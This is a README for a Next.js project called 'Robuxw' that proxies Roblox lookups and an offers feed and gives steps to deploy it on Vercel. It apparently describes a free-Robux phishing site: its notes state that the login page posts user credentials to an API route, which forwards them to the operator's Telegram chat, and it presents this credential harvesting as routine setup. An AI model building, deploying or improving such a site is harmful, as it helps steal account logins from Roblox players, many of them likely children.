# Robuxw (Next.js + static frontend)

This repo contains your static frontend (in `public/`) and Next.js API routes that proxy Roblox and offers endpoints for development and deployment on Vercel.

Key files:
- `public/` - static HTML/CSS/JS currently used by the site (index, login, profile, offers)
- `pages/api/roblox.js` - serverless proxy for Roblox username and thumbnail lookups (with retry/backoff)
- `pages/api/feed.js` - serverless proxy for the offers feed (with 5 minute in-memory cache)
- `pages/api/notify.js` - server-side Telegram notification endpoint (reads TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID from env)

Local development (Next.js):

```powershell
cd "c:\Users\tyler durden\Desktop\robuxw"
npm install
npm run dev
```

Then open http://localhost:3000/index.html and http://localhost:3000/offers.html

Vercel deployment:

1. Push this repo to GitHub.
2. Create a new project in Vercel and import the repository.
3. In Vercel project settings, add the following environment variables:
	- TELEGRAM_BOT_TOKEN
	- TELEGRAM_CHAT_ID

4. Deploy. The API routes will be available under `/api/*` and static files under `/`.

Notes:
- Keep Telegram secrets out of client-side code. `public/login.html` now posts credentials to `/api/notify` which sends the Telegram message server-side.
- `pages/api/feed.js` caches the offers feed for 5 minutes to reduce remote calls and avoid CORS issues client-side.
- Serverless functions have execution time limits; keep retry/backoff conservative in `pages/api/roblox.js`.

